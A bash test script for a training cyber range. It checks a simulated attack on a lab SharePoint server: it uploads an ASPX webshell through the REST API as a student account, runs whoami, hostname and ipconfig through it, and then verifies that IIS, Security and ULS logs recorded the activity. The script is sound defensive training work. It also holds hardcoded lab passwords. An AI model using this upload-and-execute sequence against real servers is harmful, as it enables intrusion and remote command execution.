#!/usr/bin/env bash
# =============================================================================
# test-lab.sh — End-to-end lab scenario test
# OpenRaptor Cyber Range — OD@CIRT.APAC
#
# Runs the full Module 01 attack simulation and then validates the expected
# evidence trail was generated. This is the core automated acceptance test:
# "does the scenario actually produce the telemetry students need to find?"
#
# Must be run from Kali01 (or a host with network access to SP01).
# Requires: curl, ssh (to DC01 for log checks via az vm run-command)
#
# Usage:
#   ADMIN_PASS="CirtApacAdm!n2026" bash tests/test-lab.sh
#
# Exit: 0 = scenario works end-to-end, 1 = failures
# =============================================================================

set -uo pipefail

PASS=0; FAIL=0; WARN=0

GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; RESET='\033[0m'
ok()   { echo -e "${GREEN}  [PASS]${RESET} $1"; ((PASS++)); }
fail() { echo -e "${RED}  [FAIL]${RESET} $1${2:+ — $2}"; ((FAIL++)); }
warn() { echo -e "${YELLOW}  [WARN]${RESET} $1"; ((WARN++)); }
hdr()  { echo -e "\n${YELLOW}[$1]${RESET} $2"; }

# ── Config ───────────────────────────────────────────────────────────────────
SP_IP="${SP_IP:-10.10.3.10}"
SP_HOST="${SP_HOST:-sharepoint.norca.click}"
SP_URL="http://${SP_HOST}"
ADMIN_PASS="${ADMIN_PASS:-CirtApacAdm!n2026}"
STUDENT_PASS="${STUDENT_PASS:-CirtApacStudent2026}"
JCHEN_CREDS="NORCA\\\\j.chen:${STUDENT_PASS}"
ADMIN_CREDS="NORCA\\\\cirtadmin:${ADMIN_PASS}"
WEBSHELL_SRC="${WEBSHELL_SRC:-/opt/raptor/module-01/cmd.aspx}"
WEBSHELL_PATH="Shared%20Documents/help.aspx"
SUB="${ARM_SUBSCRIPTION_ID:-68eae5b1-efab-4a2f-a117-c36bbbd72c60}"
RG_CORE="rg-cirtlab-core"
VM_SP01="win-norca-sp01"

CURL_BASE=(curl --connect-timeout 8 --max-time 20 -s
           --resolve "${SP_HOST}:80:${SP_IP}")

echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║  OpenRaptor — Module 01 End-to-End Test          ║"
echo "║  Attack simulation + evidence trail validation   ║"
echo "╚══════════════════════════════════════════════════╝"

# ── Phase 1: Pre-conditions ───────────────────────────────────────────────────
hdr "1/5" "Pre-conditions"

http_code=$("${CURL_BASE[@]}" -o /dev/null -w "%{http_code}" "$SP_URL" || echo "000")
[[ "$http_code" =~ ^(200|401|302)$ ]] && ok "SP01 reachable (HTTP ${http_code})" \
  || { fail "SP01 not reachable (HTTP ${http_code})"; echo -e "\n${RED}Cannot continue — SP01 unreachable${RESET}\n"; exit 1; }

[[ -f "$WEBSHELL_SRC" ]] && ok "Webshell payload found: $WEBSHELL_SRC" \
  || { fail "Webshell payload not found at $WEBSHELL_SRC"; echo -e "\n${RED}Cannot continue — stage toolkit first: kali_01_setup.sh${RESET}\n"; exit 1; }

# j.chen can authenticate
auth_code=$("${CURL_BASE[@]}" --ntlm -u "$JCHEN_CREDS" -o /dev/null -w "%{http_code}" \
  "${SP_URL}/_api/web?\$select=Title" -H "Accept: application/json;odata=nometadata" || echo "000")
[[ "$auth_code" == "200" ]] && ok "j.chen NTLM auth works (HTTP 200)" \
  || fail "j.chen NTLM auth failed (HTTP ${auth_code}) — check account exists and password is correct"

# Confirm clean state — webshell NOT already present
shell_pre=$("${CURL_BASE[@]}" --ntlm -u "$JCHEN_CREDS" -o /dev/null -w "%{http_code}" \
  "${SP_URL}/${WEBSHELL_PATH}" || echo "000")
[[ "$shell_pre" != "200" ]] && ok "Clean state confirmed — webshell not yet present" \
  || warn "Webshell already present — run lab_01_reset.ps1 before testing clean scenario"

# ── Phase 2: Form Digest (CSRF token) ────────────────────────────────────────
hdr "2/5" "Obtain Form Digest (SP upload auth)"

DIGEST_JSON=$("${CURL_BASE[@]}" --ntlm -u "$JCHEN_CREDS" \
  -X POST "${SP_URL}/_api/contextinfo" \
  -H "Accept: application/json;odata=nometadata" \
  -H "Content-Length: 0" || echo "")
DIGEST=$(echo "$DIGEST_JSON" | python3 -c \
  "import json,sys; d=json.load(sys.stdin); print(d.get('FormDigestValue',''))" 2>/dev/null || echo "")

[[ -n "$DIGEST" ]] && ok "Form digest obtained (${#DIGEST} chars)" \
  || { fail "Form digest failed — SP REST API not responding"; }

# ── Phase 3: Upload webshell ─────────────────────────────────────────────────
hdr "3/5" "Upload simulated webshell (as j.chen)"

if [[ -n "$DIGEST" ]]; then
  upload_code=$("${CURL_BASE[@]}" --ntlm -u "$JCHEN_CREDS" \
    -X POST "${SP_URL}/_api/web/GetFolderByServerRelativeUrl('/Shared%20Documents')/Files/Add(url='help.aspx',overwrite=true)" \
    -H "Accept: application/json;odata=nometadata" \
    -H "X-RequestDigest: ${DIGEST}" \
    -H "Content-Type: application/octet-stream" \
    --data-binary "@${WEBSHELL_SRC}" \
    -o /dev/null -w "%{http_code}" || echo "000")
  [[ "$upload_code" == "200" ]] && ok "Webshell uploaded (HTTP 200)" \
    || fail "Webshell upload failed (HTTP ${upload_code})"
else
  fail "Skipping upload — no form digest"
fi

# ── Phase 4: Execute webshell & verify response ───────────────────────────────
hdr "4/5" "Execute webshell — verify telemetry trigger"

sleep 2  # Brief pause for IIS to register the file

# Verify webshell is accessible
shell_code=$("${CURL_BASE[@]}" --ntlm -u "$JCHEN_CREDS" -o /dev/null -w "%{http_code}" \
  "${SP_URL}/${WEBSHELL_PATH}" || echo "000")
[[ "$shell_code" == "200" ]] && ok "Webshell accessible at /Shared Documents/help.aspx (HTTP 200)" \
  || fail "Webshell not accessible (HTTP ${shell_code})"

# Execute reconnaissance commands (benign — these generate IIS log entries)
for cmd in "whoami" "hostname" "ipconfig"; do
  resp=$("${CURL_BASE[@]}" --ntlm -u "$JCHEN_CREDS" \
    "${SP_URL}/${WEBSHELL_PATH}?cmd=${cmd}" || echo "")
  [[ -n "$resp" ]] && ok "Webshell executed: $cmd — response received" \
    || warn "Webshell command '$cmd' — empty response (may be normal for benign shell)"
done

# ── Phase 5: Evidence trail validation ───────────────────────────────────────
hdr "5/5" "Evidence Trail Validation"

# 5a: IIS log entries generated (via az vm run-command)
if command -v az >/dev/null 2>&1; then
  TODAY=$(date +%Y-%m-%d)
  IIS_CHECK=$(az vm run-command invoke \
    --resource-group "$RG_CORE" \
    --name "$VM_SP01" \
    --subscription "$SUB" \
    --command-id RunPowerShellScript \
    --scripts "
      \$logs = Get-ChildItem 'C:\\inetpub\\logs\\LogFiles' -Recurse -Filter '*.log' |
               Where-Object { \$_.LastWriteTime.Date -eq (Get-Date).Date }
      if (\$logs) {
        \$recent = \$logs | Sort-Object LastWriteTime -Desc | Select-Object -First 1
        \$entries = Get-Content \$recent.FullName | Select-Object -Last 20
        # Look for help.aspx in last 20 lines
        if (\$entries | Where-Object { \$_ -match 'help\.aspx' }) {
          Write-Output 'WEBSHELL_IN_LOGS'
        } else {
          Write-Output 'NO_WEBSHELL_IN_LOGS'
        }
      } else {
        Write-Output 'NO_LOGS_TODAY'
      }
    " \
    --query "value[0].message" -o tsv 2>/dev/null || echo "AZ_CLI_ERROR")

  case "$IIS_CHECK" in
    *WEBSHELL_IN_LOGS*) ok "IIS logs contain help.aspx entries — telemetry generated ✓" ;;
    *NO_WEBSHELL_IN_LOGS*) fail "IIS logs exist but no help.aspx entries found" ;;
    *NO_LOGS_TODAY*) warn "No IIS log file found for today (SP01 may have just started)" ;;
    *) warn "IIS log check skipped (az run-command error: $IIS_CHECK)" ;;
  esac

  # 5b: Windows Security Event Log — check for 4624 (logon) from j.chen
  SEC_CHECK=$(az vm run-command invoke \
    --resource-group "$RG_CORE" \
    --name "$VM_SP01" \
    --subscription "$SUB" \
    --command-id RunPowerShellScript \
    --scripts "
      \$events = Get-WinEvent -FilterHashtable @{
        LogName='Security'; Id=4624;
        StartTime=(Get-Date).AddMinutes(-30)
      } -MaxEvents 100 -ErrorAction SilentlyContinue |
      Where-Object { \$_.Message -match 'j\.chen' }
      if (\$events) { Write-Output 'LOGON_FOUND' } else { Write-Output 'NO_LOGON' }
    " \
    --query "value[0].message" -o tsv 2>/dev/null || echo "AZ_CLI_ERROR")

  case "$SEC_CHECK" in
    *LOGON_FOUND*) ok "Event ID 4624 (logon) from j.chen found in Security log ✓" ;;
    *NO_LOGON*)    warn "No recent 4624 logon events for j.chen (NTLM may log differently)" ;;
    *)             warn "Security log check skipped (az run-command: $SEC_CHECK)" ;;
  esac

  # 5c: SharePoint ULS log — check for help.aspx
  ULS_CHECK=$(az vm run-command invoke \
    --resource-group "$RG_CORE" \
    --name "$VM_SP01" \
    --subscription "$SUB" \
    --command-id RunPowerShellScript \
    --scripts "
      \$ulsPath = 'C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server Extensions\\16\\LOGS'
      \$recent = Get-ChildItem \$ulsPath -Filter '*.log' |
                 Sort-Object LastWriteTime -Desc | Select-Object -First 1
      if (\$recent) {
        \$hits = Select-String -Path \$recent.FullName -Pattern 'help\.aspx' -List
        if (\$hits) { Write-Output 'ULS_HIT' } else { Write-Output 'ULS_MISS' }
      } else { Write-Output 'NO_ULS' }
    " \
    --query "value[0].message" -o tsv 2>/dev/null || echo "AZ_CLI_ERROR")

  case "$ULS_CHECK" in
    *ULS_HIT*)  ok "ULS logs contain help.aspx reference — SharePoint telemetry ✓" ;;
    *ULS_MISS*) warn "ULS logs exist but no help.aspx hit (may take a few minutes)" ;;
    *NO_ULS*)   warn "No ULS log files found" ;;
    *)          warn "ULS check skipped ($ULS_CHECK)" ;;
  esac

else
  warn "az CLI not available — skipping log validation (run from orchestrator VM)"
fi

# ── Summary ───────────────────────────────────────────────────────────────────
TOTAL=$((PASS+FAIL+WARN))
echo ""
echo "══════════════════════════════════════════════════"
printf "  Results: ${GREEN}%d PASS${RESET}  ${RED}%d FAIL${RESET}  ${YELLOW}%d WARN${RESET}  / %d total\n" \
  "$PASS" "$FAIL" "$WARN" "$TOTAL"
echo "══════════════════════════════════════════════════"
echo ""
if [[ "$FAIL" -eq 0 ]]; then
  echo -e "${GREEN}  ✓ Module 01 scenario validated — evidence trail confirmed${RESET}"
  echo -e "${GREEN}    Lab is ready for students.${RESET}\n"
else
  echo -e "${RED}  ✗ $FAIL failure(s) — scenario not ready for students${RESET}\n"
fi
[[ "$FAIL" -gt 0 ]] && exit 1 || exit 0
